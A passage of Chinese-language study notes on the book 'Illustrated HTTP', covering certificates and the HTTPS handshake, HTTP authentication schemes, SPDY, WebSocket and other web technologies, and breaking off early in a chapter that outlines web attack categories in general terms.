tabindex="-1">7.2.4 证明公开密钥正确的证书</h4><ul><li><p>存在问题：无法证明公开密钥本身是货真价实的公开密钥，可能在公开密钥传输过程中，真正的公开密钥已经被替换</p></li><li><p>解决问题：使用由数字证书认证机构(CA,Certificate Authority)和其相关机关办法的公开密钥证书</p></li><li><p>数字证书认证机构处于客户端和服务器端双方都信赖的第三方机构的立场上，其业务流程如下<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_5.jpg" alt>[]</p></li><li><p>可证明组织真实性的EV SSL 证书：可确认服务器背后运营的企业是否真实存在</p></li><li><p>用以确定客户端的客户端的证书： 以客户端证书进行客户端认证，证明客户端服务器正在通信的对方是预料之内的客户端，作用跟服务器证书一样</p></li><li><p>认证机构信誉第一</p><ul><li>伪造证书可以骗过浏览器</li><li>虽然存在可将证书无效化的证书吊销列表（Certificate Revocation List，CRL）机制，以及从客户端删除根证书颁发机构（Root Certificate Authority，RCA）对策，但生效需要一段时间，这段时间里利益的损失就不得二至了</li></ul></li><li><p>由自认证机构办法的证书称为自签名证书</p><ul><li>如果使用OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。</li><li>独立构建的认证机构叫做自认证机构，由自认证机构颁发的“无用”证书也被戏称为自签名证书。</li><li>浏览器访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。</li></ul></li><li><p>由自认证机构颁发的服务器证书之所以不起作用，是因为它无法消除伪装的可能性。值得信赖的第三方机构介入认证，才能让已植入在浏览器内的认证机构颁布的公开密钥发挥作用，并借此证明服务器的真实性。</p></li></ul><h4 id="7.2.5-https-%E7%9A%84%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6" tabindex="-1">7.2.5 HTTPS 的安全通信机制</h4><ul><li><p>HTTPS通信步骤<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_6.jpg" alt></p></li><li><p>步骤 1： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</p></li><li><p>步骤 2： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。</p></li><li><p>步骤 3： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。</p></li><li><p>步骤 4： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</p></li><li><p>步骤 5： SSL 第一次握手结束之后，客户端以 Client Key Exchange报文作为回应。报文中包含通信加密中使用的一种被称为Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</p></li><li><p>步骤 6： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret密钥加密。</p></li><li><p>步骤 7： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。</p></li><li><p>步骤 8： 服务器同样发送 Change Cipher Spec 报文。</p></li><li><p>步骤 9： 服务器同样发送 Finished 报文。</p></li><li><p>步骤 10： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。</p></li><li><p>步骤 11： 应用层协议通信，即发送 HTTP 响应。</p></li><li><p>步骤 12： 最后由客户端断开连接。断开连接时，发送 close_notify</p></li><li><p>在以上流程中，应用层发送数据时会附加一种叫做MAC的报文摘要，能够查知报文是否遭到篡改，从而保护报文的完整性</p></li><li><p>HTTPS在使用SSL时，它的处理速度会变慢</p><ul><li><ol><li>通信慢：和使用HTTP相比，网络负载慢2到100倍，同时必须进行SSL通信，整体通信量不可避免地增加</li></ol></li><li><ol start="2"><li>处理速度慢，消耗CPU内存等资源：SSL必须进行加密处理，在客户端和服务器端都要进行加密和解密地操作</li></ol></li></ul></li><li><p>针对这一问题，没有根本性地解决方案，但可以使用专用SSL加速器这种专用服务器硬件来改善</p></li></ul><h2 id="%E7%AC%AC%E5%85%AB%E7%AB%A0-%E7%A1%AE%E8%AE%A4%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7%E5%9C%B0%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81" tabindex="-1">第八章 确认访问用户地身份认证</h2><h3 id="8.1-%E4%BD%95%E4%B8%BA%E8%AE%A4%E8%AF%81" tabindex="-1">8.1 何为认证</h3><ul><li><p>计算机无法判断显示器前使用者的身份，因此需要客户端自报家门</p></li><li><p>核对信息通常是一下这些</p><ul><li>密码：只有本人才会知道的字符串信息</li><li>动态令牌：尽心本人持有的设备内显示的一次性密码</li><li>数字证书：仅限本人终端持有的信息</li><li>生物认证：指纹和虹膜等本人的生理信息</li><li>IC卡等：仅限本人持有的信息</li></ul></li><li><p>HTTP/1.1使用的认证方式</p><ul><li>BASIC认证（基本认证）</li><li>DIGEST认证（摘要认证）</li><li>SSL客户端认证</li><li>FormBase认证（基于表单认证）</li><li>此外还有Windows统一认证（Keberos认证，NTLM认证）</li></ul></li></ul><h3 id="8.2-basic%E8%AE%A4%E8%AF%81" tabindex="-1">8.2 BASIC认证</h3><ul><li><p>BASIC 认证（基本认证）是从 HTTP/1.0 就定义的认证方式。是 Web 服务器与通信客户端之间进行的认证方式</p></li><li><p>BASIC 认证的认证步骤<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/8_1.jpg" alt></p></li><li><p>步骤 1： 当请求的资源需要 BASIC 认证时，服务器会随状态码 401 Authorization Required，返回带 WWW-Authenticate 首 部字段的响应。该字段内包含认证的方式（BASIC）及Request-URI 安全域字符串（realm）。</p></li><li><p>步骤 2： 接收到状态码 401 的客户端为了通过 BASIC 认证，需要将用户 ID 及密码发送给服务器。发送的字符串内容是由用户 ID 和密码构成，两者中间以冒号（:）连接后，再经过 Base64 编码处理。假设用户 ID 为 guest，密码是 guest，连接起来就会形成guest:guest 这样的字符串。然后经过 Base64 编码，最后的结果即是 Z3Vlc3Q6Z3Vlc3Q=。把这串字符串写入首部字段 Authorization 后，发送请求。当用户代理为浏览器时，用户仅需输入用户 ID 和密码即可，之后，浏览器会自动完成到 Base64 编码的转换工作。</p></li><li><p>步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含Request-URI 资源的响应</p></li><li><p>BASIC认证采用的Base64只是一种编码方法，并没有进行加密处理，存在隐私泄露风险</p></li><li><p>此外，如果要再进行一次 BASIC 认证时，一般的浏览器却无法实现认证注销操作，这也是问题之一</p></li><li><p>因此，BASIC 认证使用上不够便捷灵活，且达不到多数 Web 网站期望的安全性等级，因此它并不常用。</p></li></ul><h3 id="8.3-digest%E8%AE%A4%E8%AF%81" tabindex="-1">8.3 DIGEST认证</h3><ul><li><p>为弥补 BASIC 认证存在的弱点，从 HTTP/1.1 起就有了 DIGEST 认证。 DIGEST 认证同样使用质询 / 响应的方式（challenge/response），但不会像 BASIC 认证那样直接发送明文密码</p></li><li><p>所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。</p></li><li><p>因为只是响应摘要以及由质询码产生的计算结果，因此比起BASIC认证，密码泄露风险降低</p></li><li><p>DIGEST认证步骤<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/8_2.jpg" alt></p></li><li><p>步骤 1：</p><ul><li>请求需认证的资源时，服务器会随着状态码 401 Authorization Required，返回带 WWW-Authenticate 首部字段的响应。该字段内包含质问响应方式认证所需的临时质询码（随机数，nonce）。</li><li>首部字段 WWW-Authenticate 内必须包含 realm 和 nonce这两个字段的信息。客户端就是依靠向服务器回送这两个值进行认证的。<br>nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该字符串通常推荐由 Base64 编码的十六进制数的组成形式，但实际内容依赖服务器的具体实现。</li></ul></li><li><p>步骤 2：</p><ul><li>接收到 401 状态码的客户端，返回的响应中包含 DIGEST认证必须的首部字段 Authorization 信息。</li><li>首 部 字 段 Authorization 内 必 须 包 含 username、realm、nonce、uri 和 response 的字段信息。其中，realm 和 nonce就是之前从服务器接收到的响应中的字段。</li><li>username 是 realm 限定范围内可进行认证的用户名。uri（digest-uri）即 Request-URI 的值，但考虑到经代理转发后 Request-URI 的值可能被修改，因此事先会复制一份副本保存在 uri 内。</li><li>response 也可叫做 Request-Digest，存放经过 MD5 运算后的密码字符串，形成响应码。</li><li>响 应 中 其 他 的 实 体 请 参 见 第 6 章 的 请 求 首 部 字 段Authorization。另外，有关 Request-Digest 的计算规则较复杂，有兴趣的读者不妨深入学习一下 RFC2617</li></ul></li><li><p>步骤 3：</p><ul><li>接收到包含首部字段 Authorization 请求的服务器，会确认认证信息的正确性。认证通过后则返回包含 Request-URI资源的响应。</li><li>并且这时会在首部字段 Authentication-Info 写入一些认证成功的相关信息。</li></ul></li><li><p>DIGEST 认证提供了高于 BASIC 认证的安全等级，但是和HTTPS 的客户端认证相比仍旧很弱。DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。</p></li><li><p>DIGEST 认证和 BASIC 认证一样，使用上不那么便捷灵活，且仍达不到多数 Web 网站对高度安全等级的追求标准。因此它的适用范围也有所受限。</p></li></ul><h3 id="8.4-ssl%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81" tabindex="-1">8.4 SSL客户端认证</h3><p>SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书（在 HTTPS 一章已讲解）认证，服务器可确认访问是否来自已登录的客户端</p><h4 id="8.4.1-ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E7%9A%84%E8%AE%A4%E8%AF%81%E6%AD%A5%E9%AA%A4" tabindex="-1">8.4.1 SSL 客户端认证的认证步骤</h4><ul><li><p>为达到 SSL 客户端认证的目的，需要事先将客户端证书分发给客户端，且客户端必须安装此证书。</p></li><li><p>步骤 1： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。</p></li><li><p>步骤 2： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器</p></li><li><p>步骤 3： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信</p></li></ul><h4 id="8.4.2-ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E9%87%87%E7%94%A8%E5%8F%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81" tabindex="-1">8.4.2　SSL 客户端认证采用双因素认证</h4><ul><li>多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和基于表单认证（稍后讲解）组合形成一种双因素认证（Two-factor authentication）来使用。</li><li>谓双因素认证就是指，认证过程中不仅需要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为另一个因素，与其组合使用的认证方式。</li><li>第一个认证因素的 SSL 客户端证书用来认证客户端计算机，另一个认证因素的密码则用来确定这是用户本人的行为。</li></ul><h4 id="ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E5%BF%85%E8%A6%81%E7%9A%84%E8%B4%B9%E7%94%A8" tabindex="-1">SSL 客户端认证必要的费用</h4><p>这里提到的费用是指，从认证机构购买客户端证书的费用，以及服<br>务器运营者为保证自己搭建的认证机构安全运营所产生的费用。</p><h3 id="8.5-%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81" tabindex="-1">8.5 基于表单认证</h3><ul><li>基于表单的认证方法并不是在 HTTP 协议中定义的。客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。</li><li>根据 Web 应用程序的实际安装，提供的用户界面及认证方式也各不相同。</li></ul><h4 id="8.5.1-%E8%AE%A4%E8%AF%81%E5%A4%9A%E5%8D%8A%E4%B8%BA%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81" tabindex="-1">8.5.1　认证多半为基于表单认证</h4><ul><li><p>由于使用上的便利性及安全性问题，HTTP 协议标准提供的 BASIC认证和 DIGEST 认证几乎不怎么使用。另外，SSL 客户端认证虽然具有高度的安全等级，但因为导入及维持费用等问题，还尚未普及。</p></li><li><p>SSH和FTP协议已经经过广泛的验证和标准化，其认证机制已经被证明是相对安全和可靠的，可以直接使用。</p></li><li><p>但是，Web网站的认证功能因其复杂性和特殊性，没有一种通用的标准规范，因此每个Web应用程序都需要根据自身的需求和特点，自行设计和实现基于表单的认证方式。</p></li></ul><h4 id="8.5.2-session-%E7%AE%A1%E7%90%86%E5%8F%8A-cookie-%E5%BA%94%E7%94%A8" tabindex="-1">8.5.2　Session 管理及 Cookie 应用</h4><ul><li><p>基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理Session（会话）</p></li><li><p>基于表单认证本身是通过服务器端的 Web 应用，将客户端发送过来的用户 ID 和密码与之前登录过的信息做匹配来进行认证的。</p></li><li><p>但鉴于 HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用 Cookie 来管理 Session，以弥补 HTTP 协议中不存在的状态管理功能。</p></li></ul><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/8_3.jpg" alt></p><ul><li><p>步骤 1： 客户端把用户 ID 和密码等登录信息放入报文的实体部分，通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML 表单画面的显示和用户输入数据的发送</p></li><li><p>步骤 2： 服务器会发放用以识别用户的 Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与 Session ID 绑定后记录在服务器端。向客户端返回响应时，会在首部字段 Set-Cookie 内写入Session ID（如 PHPSESSID=028a8c…）</p></li><li><p>步骤 3： 客户端接收到从服务器端发来的 Session ID 后，会将其作为 Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送 Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证接收到的 Session ID 识别用户和其认证状态</p></li><li><p>不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。</p></li></ul><h2 id="%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%BD%E5%8A%A0%E5%8D%8F%E8%AE%AE" tabindex="-1">第九章 基于HTTP的功能追加协议</h2><h3 id="9.1-%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8D%8F%E8%AE%AE" tabindex="-1">9.1 基于HTTP的协议</h3><ul><li>在建立 HTTP 标准规范时，制订者主要想把 HTTP 当作传输 HTML文档的协议。随着时代的发展，Web 的用途更具多样性，比如演化成在线购物网站、SNS（Social Networking Service，社交网络服务）、企业或组织内部的各种管理工具，等等。</li><li>而这些网站所追求的功能可通过 Web 应用和脚本程序实现。即使这些功能已经满足需求，在性能上却未必最优，这是因为 HTTP 协议上的限制以及自身性能有限</li><li>HTTP 功能上的不足可通过创建一套全新的协议来弥补。可是目前基于 HTTP 的 Web 浏览器的使用环境已遍布全球，因此无法完全抛弃HTTP。</li><li>因此可以通过基于HTTP添加新的功能</li></ul><h3 id="9.2-%E6%B6%88%E9%99%A4http%E7%93%B6%E9%A2%88%E7%9A%84spdy" tabindex="-1">9.2 消除HTTP瓶颈的SPDY</h3><p>Google与2010年发布SPDY（取自SPeeDY），旨在解决HTTP性能瓶颈，缩短Web页面的加载时间</p><h4 id="9.2.1-http%E7%9A%84%E7%93%B6%E9%A2%88" tabindex="-1">9.2.1 HTTP的瓶颈</h4><ul><li><p>当百万千万的用户访问网站时，HTTP无法妥善处理这些请求，以下HTTP标准将会称为障碍</p><ul><li>一条连接上只能发送一个请求</li><li>请求只能从客户端开始，客户端不可以接受除相应以外的指令</li><li>请求/响应首部未经压缩就发送。首部信息越多延迟越大</li><li>发送冗长的首部，每次互相发送相同的首部造成的浪费越多</li><li>可任意选择数据压缩格式。非强制压缩发送<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_1.jpg" alt></li></ul></li><li><p>Ajax的解决方法</p><ul><li>Ajax（Asynchronous JavaScript and XML，异步 JavaScript 与 XML技术）是一种有效利用JavaScript和（Document Object Model，文档对象模型）的操作，以达到局部Web页面替换加载的异步通信手段，和同步通信相比，由于其只更新一部分界面，响应中传输的数据量会减少</li><li>其核心技术名为XMLHttpRequest 的 API，通过 JavaScript脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已加载完毕的 Web 页面上发起请求，只更新局部页面。</li><li>而利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_2.jpg" alt></li></ul></li><li><p>Coment的解决方法</p><ul><li>一旦服务器端的内容更新了，Comet不会让请求等待，而是直接给客户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端推送(Server Push)的功能</li><li>通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为了实现推送功能，Comet 会先将响应置于挂起状态，当服务器端有内容更新时，再返回该响应。因此，服务器端一旦有更新，就可以立即反馈给客户端</li><li>内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet也仍未解决 HTTP 协议本身存在的问题。<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_3.jpg" alt></li></ul></li><li><p>SPDY的目标</p><ul><li>Ajax和Comet的技术出现，一定程度上改善了HTTP，但HTTP协议本身的限制依然存在，因此为了进行根本性的改善，需要从协议层面改动</li><li>处于持续开发状态的SPDY便是为了在协议层面消除HTTP的瓶颈</li></ul></li></ul><h4 id="9.2.2-spdy%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%8A%9F%E8%83%BD" tabindex="-1">9.2.2 SPDY的设计和功能</h4><ul><li><p>SPDY没有完全改写HTTP协议，而是在TCP/IP的应用层和传输层之间增加新的会话层的形式运作，且考虑到安全性问题，SPDY规定通信使用SSL</p></li><li><p>以会话层的形式加入，控制对数据的流动，依然采用HTTP建立通信，因此可以正常使用HTTP方法，Cookie以及HTTP报文等<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_4.jpg" alt></p></li><li><p>使用SPDY后，HTTP协议获得以下额外功能</p><ul><li><ol><li>多路复用流：通过单一的TCP连接，可以无限制处理多个HTTP请求，所有请求处理在一条TCP连接上完成，因此TCP的处理效率得到提升</li></ol></li><li><ol start="2"><li>赋予请求优先级：SPDY不仅可以无限制地处理并发处理请求，还可以给请求逐个分配优先级顺序。这样可以在发送多个请求时，解决因贷款地而导致的响应变慢的问题</li></ol></li><li><ol start="3"><li>压缩HTTP的首部：压缩HTTP请求和响应的首部，减少通信产生的数据包数量和字节数</li></ol></li><li><ol start="4"><li>推送功能：支持服务器主动向客户端推送数据的功能，这样服务器可以直接发送数据，不用等待客户端的请求</li></ol></li><li><ol start="5"><li>服务器提示功能：服务器可以主动提示客户端请求所需的资源。这样可以在资源已缓存的情况下，避免发送不必要的请求</li></ol></li></ul></li></ul><h4 id="9.2.3-spdy%E6%B6%88%E9%99%A4web%E7%93%B6%E9%A2%88%E4%BA%86%E5%90%97" tabindex="-1">9.2.3 SPDY消除Web瓶颈了吗</h4><ul><li>使用SPDY时，Web的内容端不需要做特别改动，但是Web浏览器和服务器需要做改动。但该技术的实际应用进展不佳</li><li>原因是SPDY只是将单个域名（IP地址）的通信多路复用，所以当一个Web网站上使用多个域名下的资源时，改善效果会受到限制</li><li>SPDY确实可以有效消除HTTP的瓶颈，但很多Web网站的问题并非仅仅是由HTTP的瓶颈导致的</li></ul><h3 id="9.3-%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E8%A1%8C%E5%85%A8%E5%8F%8C%E5%B7%A5%E9%80%9A%E4%BF%A1%E7%9A%84websocket" tabindex="-1">9.3 使用浏览器进行全双工通信的WebSocket</h3><ul><li><p>利用Ajax和Comet技术进行通信可以提升Web的浏览速度，但HTTP的瓶颈依然存在。</p></li><li><p>而WebSocket网络技术正是为这些问题而实现的一套新协议和API</p><ul><li>WebSocket,即Web浏览器和Web服务器之间的全双工通信标准。其中，WebSocket协议由IETF定位标准，WebSocket API由W3C定位标准</li><li>仍在开发中的WebSocket技术主要是为了解决Ajax和Comet里XMLHttpRequest附带的缺陷所引起的问题</li></ul></li><li><p>Web服务器和客户端建立起WebSocket协议后，所有通信在这个专有协议进行，可互发送任意格式的数据</p></li><li><p>由于建立在HTTP协议的基础上，因此连接的发起方仍是客户端，而一旦确立起WebSocket通信连接，不论是服务器还是客户端任意一方都可以直接向对方发送报文。</p></li><li><p>WebSocket协议的主要特点：</p><ul><li><ol><li>推送功能：支持有服务器向客户端推送数据的推送功能</li></ol></li><li><ol start="2"><li>减少通信量：建立起WebSocket连接后，就一直保持连接状态。和HTTP相比，连接的总开销减少，且WebSocket首部信息少，通信量也响应减少</li></ol></li></ul></li><li><p>为实现WebSocket通信，在HTTP连接建立后，需要完成一次“握手”的步骤</p><ul><li>握手请求：需要使用HTTP的Upgrade首部字段，告知服务器通信协议发生变化，达到握手的目的</li><li>握手响应：对于之前的请求，返回状态码101 Swutching Protocols的响应</li><li>成功建立WebScoket连接后，通信时不再使用HTTP数据帧，而采用WebSocket独立的数据帧</li></ul></li></ul><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_5.jpg" alt></p><ul><li>WebSocket API：JavaScript 可以调用 “The WebSocket API”（<a href="http://www.w3.org/TR/websockets/%EF%BC%8C%E7%94%B1">http://www.w3.org/TR/websockets/，由</a> W3C 标准制定）内提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通信。</li></ul><h3 id="9.4-http%2F2.0" tabindex="-1">9.4 HTTP/2.0</h3><ul><li><p>HTTP/1.1 仍是目前主流标准，但随着新技术的出现，是时候推出HTTP2.0了</p></li><li><p>负责互联网技术标准的IETF（Internet Engineering Task Force，互联网工程任务组）创立httpbis工作组，其目标是推进下一代HTTP/2.0实现标准化</p></li><li><p>HTTP/2.0的目标：改善用户在使用Web时的速度体验</p></li></ul><h3 id="9.5-web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6%E7%9A%84webdav" tabindex="-1">9.5 Web服务器管理文件的WebDAV</h3><ul><li>WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）是一个可对Web服务器上的内容直接进行文件复制，编辑等操作的分布式文件系统，作为扩展HTTP/1.1的协议定义在RFC4918中</li><li>除创建删除文件等基本功能，还具备文件创建者管理，文件编辑过程中的加锁功能，以及文件内容修改的版本控制功能</li></ul><h2 id="%E7%AC%AC%E5%8D%81%E7%AB%A0-%E6%9E%84%E5%BB%BAweb%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%80%E6%9C%AF" tabindex="-1">第十章 构建Web内容的技术</h2><h3 id="10.1-html" tabindex="-1">10.1 HTML</h3><ul><li>Web页面几乎全由HTML构建<ul><li>HTML（HyperText Markup Language，超文本标记语言）。</li><li>超文本是一种文档系统，可以将文档中任意位置的信息和其他信息（文本或图片等）建立关联，即超链接文本</li><li>标记语言是指通过在文档的某部分穿插特别的字符串标签，用来修饰文档的语言，在HTML文档中，这种特殊的标签称为HTML标签Tag</li><li>HTML的版本：目前是HTML5版本</li><li>设计应用CSS：CSS（Cascading Style Sheets，层叠样式表）可以指定如何展现HTML内的各种元素，属于样式表标准之一<ul><li>通过改变应用的CSS，用浏览器看到的页面外观也会随之改变</li><li>CSS的理念就是让文档的结构和设计分离，达到解耦的目的</li></ul></li></ul></li></ul><h3 id="10.2-%E5%8A%A8%E6%80%81html" tabindex="-1">10.2 动态HTML</h3><ul><li><p>动态HTML：指使用客户端脚本语言将静态的HTML内容变成动态的技术总称。</p></li><li><p>动态HTML技术通过调用客户端脚本语言JavaScript，实现对HTML的Web页面的动态改造，利用DOM（Document Object Model 文档对象模型）可指定欲发生动态变化的HTML元素</p></li><li><p>DOM是用操作HTML文档和XML文档的API。使用DOM可以将HTML内的元素当作对象操作。</p></li><li><p>通过调用JavaScript等脚本对DOM操作，可以以更为简单的方式控制HTML</p></li></ul><h3 id="10.3-web%E5%BA%94%E7%94%A8" tabindex="-1">10.3 Web应用</h3><ul><li><p>通过Web提供功能的Web应用</p><ul><li>原本HTTP协议的Web机制是对客户端发来的请求返回提前准备好的内容</li><li>但随着Web的普及，需要引入程序创建HTML内容的做法</li></ul></li><li><p>与Web服务器及程序协作的CGI</p><ul><li>CGI（Common Gateway Interface，通用网关接口）是指Web服务器在接受客户端发送过来的请求后转发给程序的一组机制</li><li>在CGI的作用下，程序会对请求内容做出相应的动作，比如创建HTML等动态内容</li></ul></li><li><p>因Java而普及的Servlet</p><ul><li>Servlet是一种能在服务器上创建动态内容的程序。Servlet是用Java实现的一个接口，数据JavaEE的一部分</li><li>CGI由于每次接到请求，程序都需要启动一次，因此一旦访问量过大，Web服务器需要承担巨大的负担，而Servlet运行在与Web服务器相同的进程中，因此负载较小</li><li>Servlet的运行环境叫做Web容器或Servlet容器</li><li>Servlet作为解决CGI问题的对抗技术，随Java一起得到了普及</li></ul></li></ul><h3 id="10.4-%E6%95%B0%E6%8D%AE%E5%8F%91%E5%B8%83%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%92%8C%E8%AF%AD%E8%A8%80" tabindex="-1">10.4 数据发布的格式和语言</h3><ul><li><p>可扩展标记语言（XML eXtensible Markup Language）是一种可按应用目标进行扩展的通用标记语言。</p><ul><li>XML和HTML都是从标准通用标记语言SGML（Standard Generalized Markup Language）简化而来</li></ul></li><li><p>发布更新信息的RSS/Atom</p><ul><li>RSS（简易信息聚合，也叫聚合内容）和Atom都是发布新闻或博客日志等更新信息文档的格式的总成，都是用到了XML</li></ul></li><li><p>JavaScript衍生的轻量级易用JSON</p><ul><li>JSON（JavaScript Object Notation）是一种以JavaScript的对象表示法为基础的轻量级数据表示语言，能够处理的数据类型有 false/null/true/对象/数组/数字/字符串，这7种类型</li></ul></li></ul><h2 id="%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF" tabindex="-1">第十一章 Web的攻击技术</h2><h3 id="11.1-%E9%92%88%E5%AF%B9web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF" tabindex="-1">11.1 针对Web的攻击技术</h3><ul><li>简单的HTTP协议本身不存在安全问题，因此协议本身不会成会攻击对象。应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标</li></ul><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_1.jpg" alt></p><ul><li><p>HTTP只是一个通用的单纯协议机制，具备很多又是，但安全性上是劣势</p><ul><li>对于Web网站需要的会话管理，加密处理等安全性方面的共呢个，开发者需要自行开发并设计</li><li>而自行设计意味着安全等级不完备，存在Bug</li></ul></li><li><p>在客户端可以篡改请求</p><ul><li>Web应用中接收到的请求在客户端都可以自由的篡改</li><li>在HTTP请求报文中加载攻击代码，即可对Web应用攻击</li></ul></li><li><p>针对Web应用的攻击模式</p><ul><li>主动攻击：<ul><li>指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式。</li><li>由于该模式直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到资源</li><li>主动攻击代表：SQL住区和OS命令攻击</li></ul></li><li>被动攻击：<ul><li>指领用圈套策略执行攻击代码的攻击模式，此时攻击者不直接对目标Web应用访问发起攻击</li><li>通常攻击模式如下<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_2.jpg" alt><ul><li><ol><li>攻击者诱使用户出发已设置好的陷阱，而陷阱会启动发送已经嵌入攻击代码的HTTP请求</li></ol></li><li><ol start="2"><li>当用户不知不觉中中招之后，用户的浏览器或邮件客户端会触发这个陷阱</li></ol></li><li><ol start="3"><li>中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用，进行代码攻击</li></ol></li><li><ol start="4"><li>执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果</li></ol></li></ul></li><li>代表：跨站脚本攻击和跨站请求伪造</li><li>利用被动攻击，可以对原本无法从互联网上访问到的企业内网等网络发起攻击<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_3.jpg" alt></li></ul></li></ul></li></ul><h3 id="11.2-%E5%9B%A0%E8%BE%93%E5%87%BA%E5%80%BC%E8%BD%AC%E4%B9%89%E4%B8%8D%E5%AE%8C%E5%85%A8%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.2 因输出值转义不完全引发的安全漏洞</h3><ul><li>实施Web应用的安全对策可大致分为以下两部分<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_4.jpg" 